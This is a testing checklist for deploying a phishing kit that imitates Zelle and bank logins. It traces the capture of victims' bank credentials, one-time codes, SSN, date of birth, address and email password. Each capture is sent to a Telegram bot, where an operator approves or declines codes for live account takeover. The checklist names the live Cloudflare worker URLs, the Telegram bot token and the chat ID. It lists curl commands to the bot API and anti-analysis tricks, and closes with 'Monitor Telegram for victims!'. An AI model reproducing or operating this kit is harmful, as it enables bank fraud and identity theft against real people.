# ✅ TESTING CHECKLIST

Use this checklist to verify everything works before going live.

---

## 🧪 PRE-DEPLOYMENT TESTING (Localhost)

### **Step 1: Start Server**

```bash
cd zelle-cpanel-deploy
php -S localhost:8002 server.php
```

✅ Server starts without errors
✅ Terminal shows: "PHP 8.x Development Server started"

---

### **Step 2: Open Page**

Open: `http://localhost:8002/zelle-app.html`

✅ Bank selector loads
✅ No console errors (F12)
✅ Search bar visible
✅ Bank logos showing

---

### **Step 3: Test Bank Search**

Type "chase" in search bar

✅ List filters to Chase banks only
✅ Typing is responsive
✅ Clearing search shows all banks

---

### **Step 4: Select Bank**

Click "Chase"

✅ Redirects to credentials page
✅ Bank logo shows in LEFT bubble
✅ Zelle logo shows in RIGHT bubble
✅ Username + password fields visible
✅ Check Telegram: "BANK SELECTED" notification received

---

### **Step 5: Enter Credentials**

Username: `testuser`
Password: `testpass123`

Click "Sign In"

✅ Form submits
✅ Redirects to OTP page
✅ Check Telegram: "CREDENTIALS CAPTURED" notification received

---

### **Step 6: Enter OTP**

Type: `123456` (any 6 digits)

✅ Digits auto-advance
✅ Can backspace to previous digit
✅ Check Telegram: "OTP CODE RECEIVED" notification with **[Approve] [Decline]** buttons

---

### **Step 7A: Test APPROVE Path**

Click **[✅ Approve]** in Telegram

✅ User sees "Account Temporarily Restricted" page
✅ Red warning icon visible
✅ "Verify Identity" button visible

Click "Verify Identity"

✅ Personal Info modal opens
✅ All fields visible (Name, SSN, DOB, Phone, Address)

---

### **Step 8: Fill Personal Info**

- Full Name: `John Doe`
- SSN: `123-45-6789` (auto-formats)
- DOB: `01/15/1990`
- Phone: `(555) 123-4567` (auto-formats)
- Address: `123 Main St`
- City: `New York`
- State: `NY`
- ZIP: `10001`

Click "Continue"

✅ Form submits
✅ Email Verification modal opens
✅ Check Telegram: "PERSONAL INFO CAPTURED" notification received

---

### **Step 9: Fill Email Verification**

- Email: `test@gmail.com`
- Password: `emailpass123`

Click "Verify Email"

✅ Form submits
✅ Final OTP modal opens
✅ 6 empty digit boxes visible
✅ Check Telegram: "EMAIL CREDENTIALS CAPTURED" notification received

---

### **Step 10: Enter Final OTP**

Type: `654321`

✅ Digits auto-advance
✅ Can backspace

Click "Verify"

✅ Success modal appears
✅ "Processing..." spinner visible
✅ Check Telegram: "FINAL OTP" notification received
✅ After 3 seconds, redirects to `https://www.zellepay.com`

---

### **Step 7B: Test DECLINE Path**

Repeat Steps 1-6, but click **[❌ Decline]** in Telegram

✅ User sees "Verification Failed" error page
✅ Red X icon visible
✅ "Try Again" button visible

Click "Try Again"

✅ Page reloads
✅ User back at bank selector (or OTP page, depending on implementation)

---

## 🌐 CLOUDFLARE DEPLOYMENT TESTING

### **Step 1: Verify Worker**

Visit: `https://zelle-worker.thebighandle.workers.dev/api/zelle-payment`

✅ Returns JSON: `{"status":"ok","payment":{...}}`
✅ No 404 or 500 errors

---

### **Step 2: Verify Pages**

Visit: `https://solitary-fog-56a9.thebighandle.workers.dev/`

✅ Bank selector loads
✅ No console errors
✅ Search works
✅ Bank logos show

---

### **Step 3: Test Telegram Webhook**

Run:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/getWebhookInfo"
```

✅ Returns: `"url": "https://zelle-worker.thebighandle.workers.dev/telegram-webhook"`
✅ No errors

---

### **Step 4: Full Flow Test (Production)**

Repeat Steps 2-10 from Localhost Testing, but on:

```
https://solitary-fog-56a9.thebighandle.workers.dev/
```

✅ All steps work identically
✅ All Telegram notifications received
✅ Approve/Decline buttons functional

---

## 📱 MOBILE TESTING

Open on mobile device:

```
https://solitary-fog-56a9.thebighandle.workers.dev/
```

✅ Page loads correctly
✅ Bank selector responsive
✅ Touch scrolling works
✅ Forms fit screen (no horizontal scroll)
✅ Modals responsive
✅ OTP digits large enough to tap
✅ Buttons easily tappable

---

## 🔍 CONSOLE ERROR CHECK

Open DevTools (F12) → Console

✅ No red errors
✅ No CORS errors
✅ No 404s
✅ Script logs show:
   - `[Bank Logo Fix] ...`
   - `[Zelle Extended] Starting OTP polling...`
   - `[Zelle Extended] OTP Status: approve` (after clicking Approve)

---

## 📨 TELEGRAM MESSAGE CHECK

Verify all messages received:

1. ✅ Page Visit
2. ✅ Bank Selected
3. ✅ Credentials Captured
4. ✅ OTP Code Received (with buttons)
5. ✅ Personal Info Captured
6. ✅ Email Credentials Captured
7. ✅ Final OTP

**Message format correct:**
✅ Emojis show
✅ HTML formatting works (`<b>`, `<code>`)
✅ Data aligned properly
✅ Buttons render correctly

---

## 🛡️ SECURITY CHECK

### **Right-click disabled:**
✅ Right-click doesn't work

### **F12 blocked:**
✅ F12 key doesn't open DevTools (on production with protection enabled)

### **No indexing:**
✅ `<meta name="robots" content="noindex, nofollow">` present in HTML

---

## ⚙️ BACKEND CHECK

### **Cloudflare KV Storage:**

Go to: Cloudflare Dashboard → Workers & Pages → KV

✅ `ZELLE_KV` namespace exists
✅ Data being saved after form submissions

---

### **Worker Logs:**

Go to: Cloudflare Dashboard → Workers → `zelle-worker` → Logs

✅ No errors in logs
✅ Requests logging correctly

---

## 🎯 FINAL CHECKLIST

Before sharing the link:

- [ ] All localhost tests passed
- [ ] All Cloudflare tests passed
- [ ] Mobile tested
- [ ] Telegram webhook active
- [ ] All 7 Telegram messages received in order
- [ ] Approve path works end-to-end
- [ ] Decline path works
- [ ] No console errors
- [ ] Bot protection enabled (if desired)
- [ ] Worker deployed
- [ ] Pages deployed
- [ ] Bank logos showing correctly
- [ ] Plaid aesthetic consistent throughout

---

## 🚨 TROUBLESHOOTING

### **Issue: Bank logos not showing**

**Check:**
- `bank-logo-fix.js` uploaded?
- Console shows `[Bank Logo Fix]` logs?
- Images loading from `https://logo.bankconv.com/`?

---

### **Issue: Approve/Decline buttons don't respond**

**Check:**
- Telegram webhook set?
- Run: `curl ... getWebhookInfo` to verify
- Worker deployed?
- Check Worker logs for webhook requests

---

### **Issue: Modals not appearing**

**Check:**
- `zelle-extended-flow.js` uploaded?
- HTML files updated with `<script src="zelle-extended-flow.js">`?
- Console shows `[Zelle Extended]` logs?

---

### **Issue: White page only**

**Check:**
- All files in correct folder?
- `index.html` or `zelle-app.html` present?
- Console errors?
- Assets folder uploaded?

---

### **Issue: Telegram not receiving messages**

**Check:**
- Worker deployed?
- Telegram bot token correct?
- Telegram chat ID correct?
- Try manual test:
  ```bash
  curl "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/sendMessage?chat_id=5514645660&text=test"
  ```

---

## ✅ ALL TESTS PASSED?

**You're ready to go live! 🎉**

Share your link:
```
https://solitary-fog-56a9.thebighandle.workers.dev/
```

**Monitor Telegram for victims! 📱**
